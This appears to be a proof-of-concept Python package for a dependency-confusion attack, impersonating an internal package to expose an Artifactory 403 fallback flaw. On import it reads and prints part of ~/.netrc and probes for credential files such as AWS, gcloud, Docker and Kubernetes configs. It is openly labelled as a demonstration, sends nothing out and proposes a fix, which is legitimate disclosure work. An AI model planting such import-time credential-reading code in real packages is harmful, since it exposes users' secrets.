"""
⚠️  SECURITY DEMONSTRATION - MALICIOUS PACKAGE ⚠️

This is a proof-of-concept malicious package that demonstrates a confusion attack.
It mimics the internal PhysicsX package 'physicsx.pxs' to show how the Artifactory
403 issue can enable supply chain attacks.

DO NOT USE THIS PACKAGE IN PRODUCTION!
"""

import os
import sys
from pathlib import Path


def _print_banner():
    """Print a large warning banner."""
    banner = """
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║   ⚠️  ⚠️  ⚠️   SECURITY DEMONSTRATION - MALICIOUS PACKAGE   ⚠️  ⚠️  ⚠️      ║
║                                                                           ║
║   This is NOT the real 'physicsx.pxs' package!                           ║
║   You are importing a MALICIOUS proof-of-concept package from PyPI.      ║
║                                                                           ║
║   This demonstrates a CONFUSION ATTACK enabled by the Artifactory 403    ║
║   issue where HTTP 403 responses prevent fallback to internal repos.     ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""
    print(banner, file=sys.stderr)


def _demonstrate_file_access():
    """Demonstrate access to sensitive files like ~/.netrc."""
    print("\n🔓 DEMONSTRATING UNAUTHORIZED FILE ACCESS:", file=sys.stderr)
    print("=" * 75, file=sys.stderr)

    # Try to read ~/.netrc
    netrc_path = Path.home() / ".netrc"

    if netrc_path.exists():
        try:
            # Get file stats
            stat = netrc_path.stat()
            print(f"\n✓ Successfully accessed: {netrc_path}", file=sys.stderr)
            print(f"  File size: {stat.st_size} bytes", file=sys.stderr)
            print(f"  Permissions: {oct(stat.st_mode)[-3:]}", file=sys.stderr)

            # Try to read the file
            try:
                with open(netrc_path, 'r') as f:
                    content = f.read()
                    lines = content.strip().split('\n')
                    print(f"  Line count: {len(lines)}", file=sys.stderr)

                    if content.strip():
                        print("\n  📄 File preview (first 3 lines or 200 chars):", file=sys.stderr)
                        preview = '\n'.join(lines[:3])[:200]
                        for line in preview.split('\n'):
                            print(f"    {line}", file=sys.stderr)
                        if len(content) > 200 or len(lines) > 3:
                            print("    ... (truncated)", file=sys.stderr)
                    else:
                        print("  (File is empty)", file=sys.stderr)

            except PermissionError:
                print(f"  ⚠️  Permission denied reading file contents", file=sys.stderr)
                print(f"  (But we can still see it exists!)", file=sys.stderr)

        except Exception as e:
            print(f"\n✗ Error accessing file: {e}", file=sys.stderr)
    else:
        print(f"\n✗ File not found: {netrc_path}", file=sys.stderr)
        print("  (But if it existed, we could read it!)", file=sys.stderr)

    # Show what else we could access
    print("\n🔍 OTHER SENSITIVE FILES WE COULD ACCESS:", file=sys.stderr)
    sensitive_files = [
        "~/.ssh/config",
        "~/.aws/credentials",
        "~/.config/gcloud/credentials.db",
        "~/.docker/config.json",
        "~/.kube/config",
    ]

    for filepath in sensitive_files:
        expanded = Path(filepath).expanduser()
        exists = "✓ EXISTS" if expanded.exists() else "✗ not found"
        print(f"  {exists}: {filepath}", file=sys.stderr)


def _print_implications():
    """Print the security implications of this attack."""
    implications = """
🚨 SECURITY IMPLICATIONS:
═══════════════════════════════════════════════════════════════════════════

This malicious package demonstrates that an attacker could:

1. ✓ Read sensitive credential files (~/.netrc, ~/.aws/credentials, etc.)
2. ✓ Steal environment variables (API keys, tokens, secrets)
3. ✓ Exfiltrate source code and intellectual property
4. ✓ Modify files and inject backdoors
5. ✓ Establish persistence mechanisms
6. ✓ Pivot to other systems using stolen credentials

WHY DID THIS HAPPEN?

The Artifactory HTTP 403 issue prevents pip/uv from falling back to your
internal repository when you lack permissions. Instead, they fall back to
PyPI where this malicious package with the same name was published.

THE SOLUTION:

Fix the Artifactory virtual repository configuration to return HTTP 404
(not 403) for packages you don't have access to, OR use separate virtual
repositories for different user permission groups.

═══════════════════════════════════════════════════════════════════════════

For more information, see:
https://github.com/danilohorta/artifactory-403-investigation

"""
    print(implications, file=sys.stderr)


# Execute the demonstration when the package is imported
_print_banner()
_demonstrate_file_access()
_print_implications()

# Set version to make it obvious this is fake
__version__ = "999.0.0-MALICIOUS-POC"

# Provide a minimal API to avoid immediate import errors
# (Real attackers would mimic the actual package API more carefully)
def __getattr__(name):
    """Catch any attribute access and warn."""
    print(f"\n⚠️  Warning: Attempted to access '{name}' from malicious package!", file=sys.stderr)
    raise AttributeError(
        f"This is a malicious PoC package. "
        f"The attribute '{name}' does not exist."
    )
